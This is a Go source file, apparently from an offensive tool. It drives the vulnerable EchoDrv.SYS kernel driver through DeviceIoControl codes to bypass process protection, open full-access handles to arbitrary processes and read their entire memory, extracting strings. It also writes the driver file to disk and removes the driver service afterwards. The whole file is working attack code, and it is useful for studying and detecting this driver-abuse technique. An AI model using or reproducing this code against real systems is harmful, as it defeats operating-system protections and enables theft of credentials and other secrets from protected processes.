package driver

import (
	"bytes"
	"echodriver/services"
	"echodriver/utils"
	"fmt"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	IOCTL_BYPASS         = 0x9e6a0594
	IOCTL_PROCESS_HANDLE = 0xe6224248
	IOCTL_READ_MEMORY    = 0x60a26124
	WRITE_PERMS          = 0644
)

type KGetHandle struct {
	PID    uint32
	Access uint32
	Handle windows.Handle
}

type KParamReadMem struct {
	TargetProcess windows.Handle
	FromAddress   uintptr
	ToAddress     uintptr
	Length        uintptr
	Padding       uintptr
	ReturnCode    uint32
}

type MemoryBasicInformation struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}

var DRIVER_NAME = "EchoDrv.SYS"
var DRIVER_FULL_PATH, _ = windows.FullPath(DRIVER_NAME)

func GetDriverHandle() (*windows.Handle, error) {
	name, _ := windows.UTF16PtrFromString("\\\\.\\EchoDrv")
	hDriver, err := windows.CreateFile(name, windows.GENERIC_ALL, 0, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, 0)

	if err != nil {
		return nil, err
	}

	return &hDriver, nil
}

func BypassProtection(hDriver windows.Handle) error {

	buf := make([]byte, 4096)
	var bytesR uint32
	if err := windows.DeviceIoControl(hDriver, IOCTL_BYPASS, nil, 0, &buf[0], uint32(len(buf)), &bytesR, nil); err != nil {
		return err
	}

	return nil
}

func GetProcHandle(hDriver windows.Handle, pid int) (windows.Handle, error) {
	var param KGetHandle
	param.PID = uint32(pid)
	param.Access = windows.GENERIC_ALL

	paramSize := uint32(unsafe.Sizeof(param))
	var bytesReturned uint32

	err := windows.DeviceIoControl(hDriver, 0xe6224248,
		(*byte)(unsafe.Pointer(&param)), paramSize,
		(*byte)(unsafe.Pointer(&param)), paramSize,
		&bytesReturned, nil)

	if err != nil {
		return 0, fmt.Errorf("devicecontrol failed %v %v", err, windows.GetLastError())
	}

	fmt.Println(param)

	return param.Handle, nil
}

func Clean() {
	if err :=
		services.RemoveService("EchoDrv", DRIVER_FULL_PATH); err != nil {
		utils.ParseError(err)
		return
	}

	if err := os.Remove(DRIVER_FULL_PATH); err != nil {
		utils.ParseError(err)
		return
	}
}

func ReadMemoryRaw(hDriver windows.Handle, targetProcess windows.Handle, address uintptr, size uintptr) ([]byte, error) {
	buf := make([]byte, size)
	req := KParamReadMem{
		TargetProcess: targetProcess,
		FromAddress:   address,
		ToAddress:     uintptr(unsafe.Pointer(&buf[0])),
		Length:        size,
	}

	var bytesReturned uint32
	err := windows.DeviceIoControl(hDriver, IOCTL_READ_MEMORY, (*byte)(unsafe.Pointer(&req)), uint32(unsafe.Sizeof(req)), (*byte)(unsafe.Pointer(&req)), uint32(unsafe.Sizeof(req)), &bytesReturned, nil)
	if err != nil {
		return nil, err
	}

	return buf, nil
}

func ReadAllMemory(hDriver windows.Handle, targetProcess windows.Handle) (string, error) {
	var result bytes.Buffer
	var mbi MemoryBasicInformation
	address := uintptr(0)

	kernel32 := windows.NewLazyDLL("kernel32.dll")
	virtualQueryEx := kernel32.NewProc("VirtualQueryEx")

	for {
		ret, _, _ := virtualQueryEx.Call(uintptr(targetProcess), address, uintptr(unsafe.Pointer(&mbi)), unsafe.Sizeof(mbi))
		if ret == 0 {
			break
		}

		if mbi.State == windows.MEM_COMMIT && (mbi.Protect&windows.PAGE_READWRITE != 0 || mbi.Protect&windows.PAGE_READONLY != 0) {
			data, err := ReadMemoryRaw(hDriver, targetProcess, mbi.BaseAddress, mbi.RegionSize)
			if err == nil {
				parsedStrings := utils.ParseMemory(data)

				for _, v := range parsedStrings {
					result.WriteString(v + "\n")
				}
			}
		}

		address = mbi.BaseAddress + mbi.RegionSize
	}

	return result.String(), nil
}

func WriteDriver(bytes []byte) error {
	if err := os.WriteFile(DRIVER_FULL_PATH, bytes, 0644); err != nil {
		return err
	}
	return nil
}
